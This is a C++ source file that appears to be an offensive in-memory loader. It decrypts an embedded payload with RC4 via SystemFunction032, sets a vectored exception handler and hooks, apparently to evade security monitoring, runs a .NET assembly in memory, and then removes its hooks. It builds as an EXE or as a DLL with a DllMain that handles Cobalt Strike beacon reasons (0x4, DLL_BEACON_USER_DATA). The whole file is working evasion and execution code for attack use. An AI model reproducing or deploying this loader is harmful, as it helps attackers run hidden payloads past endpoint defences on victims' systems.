#ifdef _DEBUG
#include <iostream>
#endif

#include "Common.h"
#include "Native.h"
#include "Hooks.h"
#include "Execute.h"
#include "Payload.h"

int Run()
{
	std::wstring AssemblyArgs = L"audit";

	void* peContent = RemovePadding(reinterpret_cast<unsigned char*>(&payload), sizeof(payload), REAL_SIZE);

	USTRING uKey = { 0 };
	USTRING uPayload = { 0 };

	uPayload.Buffer = reinterpret_cast<unsigned char*>(peContent);
	uPayload.Length = uPayload.MaximumLength = REAL_SIZE;

	uKey.Buffer = reinterpret_cast<unsigned char*>(&key);
	uKey.Length = uKey.MaximumLength = 16;

	SystemFunction032(&uPayload, &uKey);

	if (AddVectoredExceptionHandler(1, &VehHandler) == nullptr)
	{
#ifdef _DEBUG
		printf("[!] Fail to add VEH Handler !\n");
#endif
		return EXIT_FAILURE;
	}


	if (!PrepareHook())
	{
#ifdef _DEBUG
		printf("[!] Can't set hook !\n");
#endif
		return EXIT_FAILURE;
	}

	if (!ExecuteAssembly(peContent, REAL_SIZE, &AssemblyArgs))
	{
#ifdef _DEBUG
		printf("[!]Fail to load assembly !\n");
#endif
		return EXIT_FAILURE;
	}
	printf("[!]Assembly run with success !\n");

	if (!CleanUp())
	{
#ifdef _DEBUG
		printf("[!]Fail to cleanup hooks !\n");
#endif
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

#ifdef DLL

__declspec(dllexport) bool WINAPI DllMain
(
	_In_	HINSTANCE	hinstDLL,  
	_In_	DWORD		fdwReason,     
	_In_	LPVOID		lpvReserved
)  
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case 0x4:
		Run();
		break;

	case 0x0d:	//  DLL_BEACON_USER_DATA
		break;

	case DLL_PROCESS_DETACH:
		if (lpvReserved != nullptr)
		{
			break; 
		}

		break;
	}
	return true;  
}

#else

int main()
{
	Run();
}

#endif